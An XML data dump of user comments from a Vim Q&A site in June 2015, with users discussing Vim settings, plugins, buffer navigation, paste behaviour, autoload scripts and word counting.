  <row Id="5137" PostId="3628" Score="0" Text="@lcd047, thanks but I won't change my keyboard layout for a plugin." CreationDate="2015-06-23T13:18:42.483" UserId="54" />
  <row Id="5138" PostId="3624" Score="0" Text="Or files with an email signature, which is often indicated by `--&lt;Space&gt;`. It it also tends to add lots of unnecessary &quot;junk&quot; changes in the commit log... I [wrote a little script to &quot;mass-clean&quot; this sort if stuff](http://code.arp242.net/sanitize_files)." CreationDate="2015-06-23T13:19:25.273" UserId="51" />
  <row Id="5139" PostId="3629" Score="0" Text="Ah, thanks. I tried setting `wildchar`, but didn't know about `wildcharm`." CreationDate="2015-06-23T13:22:05.237" UserId="51" />
  <row Id="5141" PostId="3668" Score="0" Text="There are a few plugins which implement this, such as tagbar and taglist." CreationDate="2015-06-23T16:15:05.280" UserId="865" />
  <row Id="5142" PostId="1981" Score="0" Text="@Carpetsmoker: Because of &quot;but not quite there&quot;, which was due to it adding a *new line* above paste ..." CreationDate="2015-06-23T16:39:06.980" UserId="220" />
  <row Id="5143" PostId="3675" Score="1" Text="A better pointer: `:help cmdline-special`" CreationDate="2015-06-23T17:49:01.630" UserId="1577" />
  <row Id="5144" PostId="3675" Score="0" Text="@lcd047 yes! Agree! Very useful!" CreationDate="2015-06-23T17:57:49.487" UserId="1145" />
  <row Id="5145" PostId="3673" Score="1" Text="This seems to work fine for me. I started Vim with `vim -u NONE` to prevent loading a vimrc file. Does this fix the problem for you? Which Vim version are you using?" CreationDate="2015-06-23T22:28:21.963" UserId="51" />
  <row Id="5146" PostId="3671" Score="0" Text="I can't reproduce your problem; which version of Vim are you using? And which commands are you using? If I use `vim` (no file), and the `:Vexplore`, then both windows have `buftype=` (empty)." CreationDate="2015-06-23T22:31:19.267" UserId="51" />
  <row Id="5147" PostId="3671" Score="1" Text="I think I just found that the issue was having set autochdir in my vimrc." CreationDate="2015-06-24T01:37:34.070" UserId="2559" />
  <row Id="5148" PostId="3673" Score="0" Text="No, that doesn't help. Vim 7.4 on Windows and Ubuntu." CreationDate="2015-06-24T05:32:43.570" UserId="2560" />
  <row Id="5149" PostId="2772" Score="0" Text="@GonçaloRibeiro Any special steps? I can't reproduce this on Windows 8.1 with GVim 7.4. I even tried with `gvim -u NONE`, using &lt;C-E&gt;. In all cases no backslash was prepended. However, using /usr/bin/vim from *cygwin* does prepend the backslash -- but the buffer still loads the correct file." CreationDate="2015-06-24T05:43:51.163" UserId="2560" />
  <row Id="5150" PostId="3669" Score="0" Text="I started using preview windows for this kind of thing, by using `ctrl-w }`." CreationDate="2015-06-24T11:17:48.430" UserId="599" />
  <row Id="5151" PostId="3669" Score="0" Text="@Vitor I didn't know this feature but that seems to be pretty useful!" CreationDate="2015-06-24T11:59:51.340" UserId="1841" />
  <row Id="5152" PostId="3682" Score="0" Text="Are you sure of the code sample you posted? I don't understand how the `return -1;` comes from. Also could you precise where you put your cursor before executing each sequence of key?" CreationDate="2015-06-24T14:16:37.853" UserId="1841" />
  <row Id="5153" PostId="3682" Score="0" Text="@statox Sorry about that...I've corrected the latter block, and added a description about where did I put the cursor. Thanks for your recommendation :-)" CreationDate="2015-06-24T14:50:45.437" UserId="2573" />
  <row Id="5154" PostId="3673" Score="0" Text="Is `paste` set, accidentally? Try`:set paste?`" CreationDate="2015-06-24T15:40:29.333" UserId="925" />
  <row Id="5156" PostId="3665" Score="0" Text="@statox Can you make it an answer, even if it's not yet perfect?" CreationDate="2015-06-24T15:52:53.187" UserId="925" />
  <row Id="5157" PostId="3683" Score="2" Text="I know [this plugin](https://github.com/vim-scripts/dbext.vim) from a colleague who worked with it. I know this plugin works but I don't personnaly have enough experience to give you some precises informations about it." CreationDate="2015-06-24T15:56:36.313" UserId="1841" />
  <row Id="5158" PostId="3631" Score="0" Text="And look at the examples included with vim in `/usr/share/vim/vim74/autoload`." CreationDate="2015-06-24T16:43:37.073" UserId="599" />
  <row Id="5159" PostId="3687" Score="0" Text="Thanks. I meant put into buffer then copy to clipboard or registers via other command." CreationDate="2015-06-24T17:19:42.060" UserId="477" />
  <row Id="5160" PostId="3665" Score="0" Text="@VolkerSiegel: Unfortunately it's more than imperfect since I did have the time to make `langmap` working properly... I will make an answer with romainl's solution and mentionning lcd047 suggestion but it will need to be improved when I have the time." CreationDate="2015-06-24T17:45:25.553" UserId="1841" />
  <row Id="5161" PostId="3682" Score="0" Text="I can't replicate this. `yi{` yanks between the curly brackets and `vap` visually selects the paragraph (the entire text in this case) but I don't see how this changes the text at all. Are you sure you're not doing `yi{` + `va{` + `p`?" CreationDate="2015-06-24T18:15:08.067" UserId="1306" />
  <row Id="5162" PostId="3682" Score="2" Text="I just tried `yi{` + `va{` + `p` on your text in a clean session (no vimrc, `-u NONE`) and that does reproduce your result. I'm not sure why, for instance `p` and `P` both give this result, despite `i{` and `a{` moving characterwise. It would help if you could a) give an example text on which your technique does work and b) confirm where in your technique the 'changing' happens. @Ben indicates a good workaround in his answer (I use that plugin) but I wouldn't mind learning why this happens in the first place." CreationDate="2015-06-24T18:37:03.483" UserId="1306" />
  <row Id="5163" PostId="3688" Score="0" Text="This is a good workaround. Would you consider adding a sentence or two explaining how this plugin works and why the particular mapping accomplishes the task?" CreationDate="2015-06-24T18:39:03.930" UserId="1306" />
  <row Id="5164" PostId="3682" Score="0" Text="I'm just like @jjaderberg I can't reproduce the behavior you describe. Giving the details asked in his comments would be a really good idea." CreationDate="2015-06-24T19:09:06.890" UserId="1841" />
  <row Id="5165" PostId="3673" Score="0" Text="@VolkerSiegel no, `paste` is not set. When `paste` is set no wrapping happens at all." CreationDate="2015-06-24T19:48:45.430" UserId="2560" />
  <row Id="5166" PostId="3687" Score="0" Text="@Thomson So you want to do 2 operations in 1 go? Put the filen name in the buffer *and* copy it to the operating system's clipboard?" CreationDate="2015-06-24T19:55:39.490" UserId="51" />
  <row Id="5167" PostId="3687" Score="0" Text="I just want to copy the file name of the buffer to clipboard, the previous 2 operations are an crappy workaround." CreationDate="2015-06-24T22:22:40.460" UserId="477" />
  <row Id="5168" PostId="3681" Score="0" Text="Re: Note 3. From what I rememer, Windows Explorer launches the program 2 times when you open 2 files (it runs `gvim file1` and `gvim file2`). However, the filemanager you used on Debian may invoke gvim only once with all the files in the argument list (`gvim file1 file2`). The difference in behaviour is not in gVim as such, but in how it is invoked..." CreationDate="2015-06-25T00:26:14.870" UserId="51" />
  <row Id="5169" PostId="3681" Score="0" Text="@carpetsmoker that seems right but is it possible to change this behavior? Or is my question not related enough with vim? Maybe I should have asked it on super user?" CreationDate="2015-06-25T02:00:40.160" UserId="1841" />
  <row Id="5170" PostId="3682" Score="0" Text="@jjaderberg yeah...It's `va{` + `p`" CreationDate="2015-06-25T02:56:25.927" UserId="2573" />
  <row Id="5171" PostId="3682" Score="0" Text="@jjaderberg If there is a space character before the first curly bracket, This technique would work perfectly." CreationDate="2015-06-25T03:00:20.957" UserId="2573" />
  <row Id="5172" PostId="3682" Score="0" Text="@statox I've just edited the description. :-)" CreationDate="2015-06-25T03:06:25.603" UserId="2573" />
  <row Id="5173" PostId="3688" Score="0" Text="Is there any elegant way to remove those braces without a plugin? : (" CreationDate="2015-06-25T03:22:31.040" UserId="2573" />
  <row Id="5174" PostId="3688" Score="0" Text="Maybe. But surround is really light-weight and one of the &quot;essential&quot; plugins. So may as well install it..." CreationDate="2015-06-25T03:29:01.450" UserId="1094" />
  <row Id="5175" PostId="3692" Score="0" Text="Have you tried reporting this to the maintainers of your distribution?" CreationDate="2015-06-25T06:56:32.540" UserId="1577" />
  <row Id="5177" PostId="3692" Score="2" Text="Does the problem also occur when you load Vim without plugins?" CreationDate="2015-06-25T07:07:41.710" UserId="51" />
  <row Id="5178" PostId="3692" Score="0" Text="@lcd047 not yet. you think maybe this caused by distribution?" CreationDate="2015-06-25T07:35:18.020" UserId="1276" />
  <row Id="5179" PostId="3692" Score="0" Text="It's way to early to blame the distribution for this. I see powerline in your screenshot. So this means you have plugins. Thus, as Carpetsmoker suggested, start vim with   `vim -Nu NONE` and see if you still have problems. That should get you started." CreationDate="2015-06-25T07:36:15.627" UserId="246" />
  <row Id="5180" PostId="3692" Score="0" Text="My first suspect would be a problem between your `gnome-terminal` and `terminfo`.  `gnome-terminal` never really grasped that concept. :)" CreationDate="2015-06-25T07:38:32.383" UserId="1577" />
  <row Id="5181" PostId="3682" Score="0" Text="@MrDwz: Thanks for the edit now I can reproduce, and I still I don't know what explain this behavior... If you're looking for a solution which doesn't involve a plugin I think the answer of Gilles is the most straightforward :)" CreationDate="2015-06-25T07:50:40.950" UserId="1841" />
  <row Id="5182" PostId="3693" Score="0" Text="If I am not mistaken, this will effectively limit the total number of open Vim instances to just a single one?" CreationDate="2015-06-25T08:50:23.353" UserId="51" />
  <row Id="5183" PostId="3693" Score="0" Text="@Carpetsmoker &quot;Sort of&quot;. If you have an existing gVim session, the files opened by this method will be added as new tabs (and if you have multiple sessions, they will be added to the most recently created). But it doesn't prevent you from opening multiple sessions using other methods (eg, running `gvim.exe` again, right-clicking and editing, etc)." CreationDate="2015-06-25T08:56:28.340" UserId="2582" />
  <row Id="5184" PostId="3693" Score="0" Text="@mjturner: Thank for your solution it is pretty close from what I wanted except that it opens files in different tabs instead of different buffers in one tab only but that's what I'm going to use if I can't find something closer to what I want :)" CreationDate="2015-06-25T09:02:20.873" UserId="1841" />
  <row Id="5185" PostId="3693" Score="0" Text="@statox Great! I thought `--remote-silent` might do what you want, but it doesn't open a new buffer, it replaces the active one." CreationDate="2015-06-25T09:08:05.763" UserId="2582" />
  <row Id="5186" PostId="3693" Score="0" Text="@mjturner Yeah and after reading the doc (`h clientserver`) I found not option opening files in buffers in the same tabs so I guess that's the closer I can get from what I want. Thanks for your help!" CreationDate="2015-06-25T09:26:22.630" UserId="1841" />
  <row Id="5187" PostId="3693" Score="2" Text="@statox You can sent `$any` command with `--remote` or `--remote-silent`. See [`:help --remote`](http://vimhelp.appspot.com/remote.txt.html#--remote) for an example." CreationDate="2015-06-25T09:40:20.067" UserId="51" />
  <row Id="5188" PostId="3683" Score="1" Text="Basic vim will not work for what you want because it is built to edit text. What people normally do is to have a terminal/console open in parallel to execute those commands. But you might try neovim if you really need to have a terminal running inside vim..." CreationDate="2015-06-25T11:05:53.400" UserId="599" />
  <row Id="5189" PostId="3693" Score="0" Text="@Carpetsmoker: I don't understand how to exploit this feature: I tried to add function like `:e` in the key like    `   &quot;C:\folder\to\gvim.exe\&quot; --remote-tab-silent :e \&quot;%1\&quot;    `    to open new buffer but gVim only tries to open a file named `:e`. (Sorry I can't quote the register line properly in this comment)" CreationDate="2015-06-25T12:40:49.887" UserId="1841" />
  <row Id="5190" PostId="3694" Score="0" Text="By &quot;the file I just edited last&quot; do you literally mean &quot;the file I most recently made edits to&quot;? Or do you just mean the last one that you had visible in Vim?" CreationDate="2015-06-25T13:14:11.140" UserId="343" />
  <row Id="5191" PostId="3694" Score="2" Text="If the latter, I personally just mash `Ctrl-O` (or sometimes `Ctrl-T`) till I get there." CreationDate="2015-06-25T13:16:42.667" UserId="343" />
  <row Id="5193" PostId="3682" Score="0" Text="@statox eh...Actually, What I'm curious about is how does the paste behave in the visual mode. It's so strange that I get the right selected area but the last character goes down :-(" CreationDate="2015-06-25T13:56:28.490" UserId="2573" />
  <row Id="5194" PostId="3694" Score="0" Text="Yes that's what I do too `Ctrl-O` and `Ctrl-I`. But it jumps between edit points and that breaks the flow. All I want to go back and forth between buffers in order of access. How plugins display a list of most recent files? Do they keep track of them internally?" CreationDate="2015-06-25T13:57:33.367" UserId="237" />
  <row Id="5195" PostId="3694" Score="0" Text="`Ctrl-^` swaps between two last files. But what is the best way to navigate between more?" CreationDate="2015-06-25T14:00:39.263" UserId="237" />
  <row Id="5196" PostId="3695" Score="1" Text="I was **not** asking to set an indentation based on the filetype. Anyway, the second question with an answer pointing to `vim-sleuth` is what I was looking for. Thanks to the one pointing to that one." CreationDate="2015-06-25T14:03:22.737" UserId="1109" />
  <row Id="5197" PostId="3699" Score="7" Text="Sidenote: `&lt;C-q&gt;` is  the terminal &quot;start&quot; signal; Vim never sees it. Use `stty start undef` to disable it so that Vim sees it. You probably also want to disable the &quot;stop&quot; signal (`&lt;C-s&gt;`) with `stty stop undef`." CreationDate="2015-06-25T15:21:54.907" UserId="51" />
  <row Id="5198" PostId="3700" Score="0" Text="I've tried to setup `curl` example, now I got this message: `:!curl 'http://www.ietf.org/rfc/rfc7386.txt' -o '/tmp/vbA49BG/1.txt'`, but anyway there is nothing in directory `/tmp/vbA49BG/`. Whem I'm executing this command right from the terminal `curl 'http://www.ietf.org/rfc/rfc7386.txt' -o '/tmp/vbA49BG/1.txt`, everything is ok. It looks like something wrong with file creation." CreationDate="2015-06-25T15:26:55.213" UserId="30" />
  <row Id="5199" PostId="3700" Score="0" Text="@erthalion This is also the case on my system. The `/tmp/[...]` directory is empty. This is I would expect, since tmp files are exactly that: temporarily... For some reason, the directory is removed later (perhaps there is a reason for this, but it could also be a bug)." CreationDate="2015-06-25T15:31:33.743" UserId="51" />
  <row Id="5200" PostId="3701" Score="0" Text="You're the man. I was thinking that if I used `&lt;C-v&gt;` in a command, it would just call what I had remapped it to. Is that what the `normal!` is for?" CreationDate="2015-06-25T15:34:22.927" UserId="2276" />
  <row Id="5201" PostId="3702" Score="0" Text="Cool cool, thanks for the explanation." CreationDate="2015-06-25T15:37:49.887" UserId="2276" />
  <row Id="5202" PostId="3700" Score="0" Text="Not a bug.  The directory is reused for other temporary files, and it's removed when you quit Vim." CreationDate="2015-06-25T15:43:50.450" UserId="1577" />
  <row Id="5203" PostId="3700" Score="0" Text="@lcd047 temporary directory is empty even before I quit vim, is that ok?" CreationDate="2015-06-25T15:52:03.323" UserId="30" />
  <row Id="5204" PostId="3700" Score="1" Text="@erthalion Yes.  On UNIX it's ok to delete files from disk while they are still open (the process holding them open won't notice).  Doing this is a common practice with temporary files." CreationDate="2015-06-25T16:03:05.823" UserId="1577" />
  <row Id="5205" PostId="2285" Score="0" Text="You can get the same effect by wrapping this command in a function, since then the last search term is automatically restored :-) This way you don't have to muck about with `:nohl` either, if if you were highlighting something, it will keep highlighting it (see my updated answer)." CreationDate="2015-06-25T16:39:28.953" UserId="51" />
  <row Id="5206" PostId="3029" Score="1" Text="The last used search term should be automatically preserved when you leave a function; so mucking about with `@/` should not be required (in this case, anyway)." CreationDate="2015-06-25T16:43:21.087" UserId="51" />
  <row Id="5207" PostId="3694" Score="0" Text="By access, it's still not clear if you mean the order they were opened, written to, in a focused window, or changed.&#xA;&#xA;`Ctrl-O/I` are window-specific fwiw, while MRU is usually global.&#xA;&#xA;If you do want order by most recently accessed, as soon as you jump back once, the order of the list changes, further complicating things." CreationDate="2015-06-25T17:17:50.133" UserId="680" />
  <row Id="5208" PostId="3698" Score="3" Text="`'conceallevel'` is a window local setting. This means you can easily use splits. One for editing with `set conceallevel=0` and the other window with the default ( `set conceallevel=2`)." CreationDate="2015-06-25T17:20:23.063" UserId="778" />
  <row Id="5210" PostId="3703" Score="2" Text="Without looking at the code, I'd say filetypes are detected again for all buffers.  Not sure that's intended, you might want to post about it on vim_dev." CreationDate="2015-06-25T21:22:47.443" UserId="1577" />
  <row Id="5211" PostId="3677" Score="0" Text="Great thanks, going to try this out and then mark this as accepted if it works." CreationDate="2015-06-25T23:27:01.220" UserId="2531" />
  <row Id="5212" PostId="3694" Score="0" Text="Yes I understand but I agree to anything that can improve current `:bn` `:bp` behavior. The buffers I often see are totally out of place. Maybe there is a plugin that can keep track of the recent files and provide hooks so I can create mappings? Something like `Ctrl-O` that goes to prev file immediately without jumping around the current buffer." CreationDate="2015-06-25T23:49:51.457" UserId="237" />
  <row Id="5213" PostId="156" Score="0" Text="Just discovered that this solution doesn't quite work in visual mode (slightly different behavior depending on which visual mode, it'll either stay in the same position or move by only one line). Any pointers on what's going on there?" CreationDate="2015-06-26T02:30:00.997" UserId="67" />
  <row Id="5214" PostId="3694" Score="0" Text="Using marks may be another option. If you know you're going to come back to a file. Just mark it! Use the capital letter marks to make them persist even after restarting vim! For example `mA` will mark the current file to A, and then you can simply go back by using ``A`" CreationDate="2015-06-26T04:55:38.913" UserId="246" />
  <row Id="5215" PostId="3694" Score="0" Text="The problem is I don't know it upfront. I usually edit controller, view, model, styles and scripts together. And I normally jump back and forth between files as I need to apply changes in few places." CreationDate="2015-06-26T04:57:51.507" UserId="237" />
  <row Id="5216" PostId="3706" Score="0" Text="Brilliant; that totally did it! Do you do this for all settings in your `.vimrc`?" CreationDate="2015-06-26T06:12:37.193" UserId="2593" />
  <row Id="5217" PostId="3706" Score="0" Text="@RyanLue This trick is mostly useful for string-valued options, or when saving / restoring options in scripts.  I don't bother with it otherwise." CreationDate="2015-06-26T06:19:09.300" UserId="1577" />
  <row Id="5218" PostId="3698" Score="0" Text="Thanks @PeterRincker, I've added that to the answer." CreationDate="2015-06-26T09:00:47.400" UserId="51" />
  <row Id="5219" PostId="2770" Score="0" Text="@Badger Glad to hear it. :)" CreationDate="2015-06-26T09:35:43.253" UserId="343" />
  <row Id="5221" PostId="3714" Score="0" Text="No need to be sorry for that. I'm not sure making it a gist would be really useful since I think a lot of people wrote [better](http://usevim.com/2012/07/18/nerdtree/) [stuff](http://code.tutsplus.com/tutorials/vim-essential-plugin-nerdtree--net-19692) than is answer. :-)" CreationDate="2015-06-26T14:38:15.183" UserId="1841" />
  <row Id="5223" PostId="3716" Score="0" Text="I think you want `&lt;C-w&gt;o`? (also see: [How to “full screen” browse Vim help?](http://vi.stackexchange.com/q/358/51))." CreationDate="2015-06-26T15:08:48.007" UserId="51" />
  <row Id="5224" PostId="3716" Score="0" Text="Erf how could have I not find this? (Maybe this question should be marked as duplicate actually) That's exactly what I want thanks. But is it normal that when I'm on an help buffer, I do `:bn` to go back to my previous buffer that close the help buffer (it doesn't appear anymore in `:ls`)?" CreationDate="2015-06-26T15:15:17.633" UserId="1841" />
  <row Id="5225" PostId="3620" Score="0" Text="@lcd047 You *can* actually share your knowledge, by asking a asking *and* answering your own question. This will also encourage *other* people to share *their* knowledge on the subject by providing alternative (perhaps better?) solutions. Everybody wins! Also [see my answer in the meta post](http://meta.vi.stackexchange.com/a/1282/51)." CreationDate="2015-06-26T15:27:51.240" UserId="51" />
  <row Id="5226" PostId="3624" Score="0" Text="Also see: [What's the simplest way to strip trailing whitespace from all lines in a file?](http://vi.stackexchange.com/q/454/51). You should perhaps add this as an answer there (although this is pretty much the same to the ones already posted I think?)" CreationDate="2015-06-26T15:29:54.353" UserId="51" />
  <row Id="5227" PostId="3625" Score="0" Text="Also see: [Re-indenting badly indented code](http://vi.stackexchange.com/q/236/51). You should perhaps add this as an answer there." CreationDate="2015-06-26T15:31:18.083" UserId="51" />
  <row Id="5228" PostId="3626" Score="0" Text="Note that this will clobber your `c` and `h` marks :-) Also see: [What's the simplest way to strip trailing whitespace from all lines in a file?](http://vi.stackexchange.com/q/454/51). You should perhaps add this as an answer there (although this is pretty much the same to the ones already posted I think?)" CreationDate="2015-06-26T15:32:43.337" UserId="51" />
  <row Id="5229" PostId="3719" Score="3" Text="I can't recommend this enough.  Always look for solutions that vim has by default before looking for plugins." CreationDate="2015-06-26T17:09:15.890" UserId="865" />
  <row Id="5230" PostId="3725" Score="5" Text="[This post](http://stackoverflow.com/a/4571319/1658042) explains how to rotate windows.  [This](http://stackoverflow.com/questions/1269603/to-switch-from-vertical-split-to-horizontal-split-fast-in-vim) is about switching splits from vertical to horizontal." CreationDate="2015-06-27T05:51:55.163" UserId="1577" />
  <row Id="5231" PostId="3725" Score="0" Text="@lcd047 Those are questions outside of this site. Is it worth writing a small answer here and include the links (which are valuable)?" CreationDate="2015-06-27T06:02:24.857" UserId="66" />
  <row Id="5232" PostId="3725" Score="1" Text="@Bernhard I suppose this is a good question for [meta](http://meta.vi.stackexchange.com/)." CreationDate="2015-06-27T06:05:26.953" UserId="1577" />
  <row Id="5234" PostId="3725" Score="0" Text="@Bernhard [Yes](http://meta.vi.stackexchange.com/questions/45/what-do-we-do-with-questions-that-are-already-answered-somewhere-else-on-se). Make sure to write a complete answer, not just links." CreationDate="2015-06-27T10:45:41.600" UserId="8" />
  <row Id="5235" PostId="3726" Score="0" Text="What encoding and fileencoding are you using?" CreationDate="2015-06-27T11:56:43.663" UserId="1430" />
  <row Id="5236" PostId="3727" Score="1" Text="Unfortunately I'm not in control of all the places such regular expressions are used. Any number of plugins make use of `\w` and hence they all fall down when it comes to this. Rather than patching every since one (if I can even track down the culprits) it would be easier for me to patch vim so that `\w` works. Bah." CreationDate="2015-06-27T12:20:49.917" UserId="267" />
  <row Id="5237" PostId="3726" Score="0" Text="@cxw `utf-8` across the board. And yes it is set in both those settings." CreationDate="2015-06-27T12:22:42.787" UserId="267" />
  <row Id="5238" PostId="3725" Score="0" Text="@lcd047 i know how to do both. but those actions are window wise. i don't know how to do in within a split." CreationDate="2015-06-27T12:36:50.253" UserId="1097" />
  <row Id="5239" PostId="3725" Score="0" Text="Then please explain what you're trying to do and why the two answers I pointed you to don't address the problem." CreationDate="2015-06-27T12:51:40.197" UserId="1577" />
  <row Id="5240" PostId="3725" Score="0" Text="@lcd047 as i said, you want to swap two windows within a split, not a window. i checked `help wincmd`, seems no help." CreationDate="2015-06-27T13:18:12.213" UserId="1097" />
  <row Id="5242" PostId="3728" Score="1" Text="Use mappings to `wincmd`&#xA;&#xA;For example you can map:&#xA;&#xA;`:nmap wj :wincmd j&lt;cr&gt;` it's acts same as `CTRL-W j` (move to window below).&#xA;&#xA;`:help wincmd`" CreationDate="2015-06-27T14:06:06.993" UserId="1145" />
  <row Id="5243" PostId="3726" Score="1" Text="You've tagged this question as [tag:neovim]. I would suggest you open an issue in the NeoVim issue tracker, if there isn't one already. This probably won't be fixed in the short-term, but will be down the line... You can also try posting a message to vim_dev about this, but I suspect everyone will agree that something needs to be done, after which nothing changes." CreationDate="2015-06-27T14:15:06.180" UserId="51" />
  <row Id="5244" PostId="3729" Score="0" Text="Solves my problem. Added the mapping to my vimrc and tested a bit with no issues." CreationDate="2015-06-27T14:16:09.043" UserId="2612" />
  <row Id="5245" PostId="3728" Score="0" Text="@AlexKroll Why don't you post that as an answer? :-)" CreationDate="2015-06-27T14:16:20.993" UserId="51" />
  <row Id="5246" PostId="3728" Score="0" Text="@Carpetsmoker It's not full cover for this problem I think. `CTRL-W j` works with counters (go to n-th window below from current) my solution does not." CreationDate="2015-06-27T14:22:17.610" UserId="1145" />
  <row Id="5247" PostId="3731" Score="0" Text="Sadly this is not true.  `&amp;runtimepath` is manipulated by plugin managers, there is absolutely no reason for it to start with `$HOME/.vim` or with `$HOME\vimfiles`." CreationDate="2015-06-27T16:34:36.130" UserId="1577" />
  <row Id="5248" PostId="3731" Score="0" Text="@lcd047, in its default state, `&amp;runtimepath` always start with the default user-level runtime directory for the current platform. Now, it is obviously possible for the user to butcher his `'rtp'` beyond recognition but AFAIK pathogen, vundle, plug, VAM and neobundle *all* leave `~/.vim` (or similar) at the beginning." CreationDate="2015-06-27T17:19:24.570" UserId="54" />
  <row Id="5249" PostId="3734" Score="0" Text="Why separate between the `autoload/` and `plugin/` directories? I've always put everything in `plugin/` and that seems to work fine?" CreationDate="2015-06-27T17:30:33.097" UserId="51" />
  <row Id="5250" PostId="3734" Score="1" Text="The autoload directory only loads it's contents when needed.  This can speed up the start time of vim somewhat.  In other words, it works about the same as `plugin/` except it is only loaded once it is needed instead of being loaded on startup." CreationDate="2015-06-27T17:33:01.700" UserId="865" />
  <row Id="5251" PostId="3731" Score="0" Text="Only with the default configuration.  For a long time I used something like this: `pathogen#infect(&quot;$VIM/local/bundle/{}&quot;)`, to allow me to (1) have bundles available to all users, (2) keep them separate from Vim's main runtime, and (3) allow me to upgrade them automatically.  `~/.vim` ends up in the middle of the bunch with that setup." CreationDate="2015-06-27T18:25:24.707" UserId="1577" />
  <row Id="5252" PostId="3734" Score="2" Text="@Carpetsmoker Pretty much as @EvergreenTree said.  Of course, it doesn't really matter for &quot;small&quot; plugins, but it's still good practice.  With Vim you have very little control on the garbage collector, and loading things only when and if they are needed can make a difference.  On the other hand, there are subtle downsides to moving everything to `autoload`, f.i. you can't test for the existence of a function if the file it lives in hasn't been loaded." CreationDate="2015-06-27T18:34:58.307" UserId="1577" />
  <row Id="5253" PostId="3728" Score="2" Text="I don't normally appreciate advice like this, but I would look for another terminal. `&lt;C-W&gt;` is too useful a shortcut (not only in many places in Vim, but also in bash) to forfeit. I'd be curious what other key bindings are consumed by the terminal -- `&lt;C-T&gt;`? At the very least, I'd look into whether these are configurable in the terminal." CreationDate="2015-06-27T19:38:01.903" UserId="64" />
  <row Id="5254" PostId="3731" Score="0" Text="@lcd047, I changed the wording of the first sentence as per our conversation." CreationDate="2015-06-27T20:40:10.757" UserId="54" />
  <row Id="5255" PostId="3738" Score="0" Text="Note you can just use `:hi comment gui=bold cterm=bold`, no need for the `if` statement here." CreationDate="2015-06-28T00:03:55.997" UserId="51" />
  <row Id="5258" PostId="3742" Score="0" Text="These need a g along with the n in order to make them global (otherwise, they only match one word per line). The second one also needs an s at the beginning." CreationDate="2015-06-28T00:29:47.770" UserId="648" />
  <row Id="5259" PostId="3741" Score="0" Text="I had found something like this while searching, but missed that the first g is part of the counting command, not a location specifier. This solution makes sense now. I apparently should also read up on Visual mode; I don't use it often enough." CreationDate="2015-06-28T00:31:28.623" UserId="648" />
  <row Id="5260" PostId="3742" Score="1" Text="Fixed, sorry about that." CreationDate="2015-06-28T00:32:55.927" UserId="865" />
  <row Id="5261" PostId="3743" Score="0" Text="Ah, I figured there would be some way of getting the state of the `cterm` or `gui` attributes." CreationDate="2015-06-28T00:35:27.420" UserId="865" />
  <row Id="5262" PostId="3743" Score="0" Text="Nice! Thanks. But I think nomap is wrong. Can you correct it please? I dont know which map command I would want to use here." CreationDate="2015-06-28T00:37:46.943" UserId="2620" />
  <row Id="5263" PostId="3742" Score="1" Text="Using `\w` sounds like a nice idea at first, but after testing it I found a number of problems. The biggest is that it won't match non-ascii characters, so a word like `über` is simply skipped (there was a [question about this](http://vi.stackexchange.com/q/3726/51) yesterday). Also, a word like `e-mail` is counted as 2 words, since `-` is not in `\w` (using a `-` is somewhat uncommon in English, but very common in Dutch for example). There may be other characters which are ignored in this fashion, which brings us to my last point: conventions as to what is considered a &quot;word&quot; may differ ..." CreationDate="2015-06-28T00:43:17.810" UserId="51" />
  <row Id="5264" PostId="3742" Score="0" Text="... in various languages, and &quot;proper&quot; tools like `wc` may pick up on the locale (I don't know if GNU `wc` actually deals with this by the way, GNU tools are not well known for their excellent unicode support)." CreationDate="2015-06-28T00:43:21.837" UserId="51" />
  <row Id="5265" PostId="3742" Score="0" Text="That is interesting.  I might add that as a plus to the `wc` solution." CreationDate="2015-06-28T00:44:52.240" UserId="865" />
  <row Id="5266" PostId="3743" Score="0" Text="@Mike Oops, sorry, I meant to use `noremap`, which is the same as `map` but non-recursive. See [Learn VimScript the Hard way](http://learnvimscriptthehardway.stevelosh.com/chapters/03.html) chapters 3 through 5 (especially chapter 5) to learn why you should always use `noremap` and never `map`." CreationDate="2015-06-28T00:46:19.407" UserId="51" />
  <row Id="5267" PostId="3741" Score="1" Text="I had no idea that you could use `g&lt;C-g&gt;` that way.  Awesome!" CreationDate="2015-06-28T00:48:12.840" UserId="865" />
  <row Id="5268" PostId="3742" Score="0" Text="At least on my system (cygwin, in the US), the vimscript method gave me the same result as running wc from from the command line. The file I tested it on has a few hyphenated words, and no non-ascii characters. Being off by a couple of words is close enough for my immediate purposes, but that's a good gotcha to keep in mind." CreationDate="2015-06-28T02:33:47.337" UserId="648" />
  <row Id="5269" PostId="3748" Score="0" Text="Beautiful! Curious: what happens if I modify a file so opened?" CreationDate="2015-06-28T02:34:38.060" UserId="205" />
  <row Id="5270" PostId="3748" Score="1" Text="@muru You will notice that the buffer is opened up in a read only buffer (probably notice an `[RO]` in the status line)." CreationDate="2015-06-28T02:38:24.570" UserId="778" />
  <row Id="5271" PostId="3748" Score="0" Text="yep, it's there." CreationDate="2015-06-28T02:42:46.583" UserId="205" />
  <row Id="5272" PostId="3749" Score="0" Text="And can I get it to detect filetype, syntax, etc. automatically with this method?" CreationDate="2015-06-28T02:44:26.460" UserId="205" />
  <row Id="5273" PostId="3749" Score="0" Text="Sadly not without some more work; I updated the post" CreationDate="2015-06-28T02:45:00.717" UserId="227" />
  <row Id="5274" PostId="3749" Score="1" Text="I do recommend using the plugin method from @PeterRinker's post if you can. It should do a lot of the nice things you'd like. I mostly wanted to show that one needn't leave the editor nor deal with the hassles of piping to get the data, and I know that there are some people who hate having to use plugins." CreationDate="2015-06-28T02:57:28.470" UserId="227" />
  <row Id="5275" PostId="3749" Score="1" Text="I just added a bit to be able to detect filetype. It is no longer something you'd want to just type on-the-fly, but could work as an easy addition to a .vimrc. Using a specific plugin will still probably work better." CreationDate="2015-06-28T03:22:33.357" UserId="227" />
  <row Id="5276" PostId="3749" Score="0" Text="You might want to look into using `:file` to name your file instead of having a temporary file. See `:h :file`" CreationDate="2015-06-28T05:06:42.607" UserId="778" />
  <row Id="5277" PostId="3749" Score="0" Text="@PeterRincker excellent suggestion! I'll try it and update in a bit. I had actually checked `:help :file` when I was writing the post, but my version of Vim (7.4 on Ubunut 14.04) only says `:file` prints the filename and additional info (like ctrl-g), not mentionaing anything about it changing the filename if given an argument. Just now found that tidbit under `:help :file_f`  :-)" CreationDate="2015-06-28T05:12:40.730" UserId="227" />
  <row Id="5278" PostId="3731" Score="0" Text="Did it for me, and strikes me as the most elegant solution, given my setup. Thanks!!" CreationDate="2015-06-28T05:38:09.913" UserId="2593" />
